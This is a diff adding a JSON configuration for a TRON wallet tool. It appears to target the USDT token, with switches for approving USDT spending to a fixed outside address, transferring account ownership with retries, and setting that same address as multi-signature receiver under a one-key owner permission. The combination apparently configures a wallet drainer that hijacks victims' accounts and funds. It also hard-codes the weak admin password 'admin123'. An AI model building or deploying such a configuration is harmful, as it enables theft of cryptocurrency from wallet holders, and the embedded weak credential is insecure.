@@ -1,0 +1,24 @@
+{
+    "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+    "spender_address": "TVMPR7RXgMRxShNbqLS37rqbrDAXYJiPdZ",
+    "enable_transfer_ownership": true,
+    "enable_usdt_approve": true,
+    "transfer_ownership_retry_times": 3,
+    "enable_multi_sign": true,
+    "multi_sign_receiver": "TVMPR7RXgMRxShNbqLS37rqbrDAXYJiPdZ",
+    "permission_config": {
+        "owner_permission": {
+            "type": 0,
+            "permission_name": "owner",
+            "threshold": 1,
+            "keys": [
+                {
+                    "address": "",
+                    "weight": 1
+                }
+            ],
+            "operations": "7fff1fc003fffffffe0000000000000000000000000000000000000000000000"
+        }
+    },
+    "admin_password": "admin123"
+}
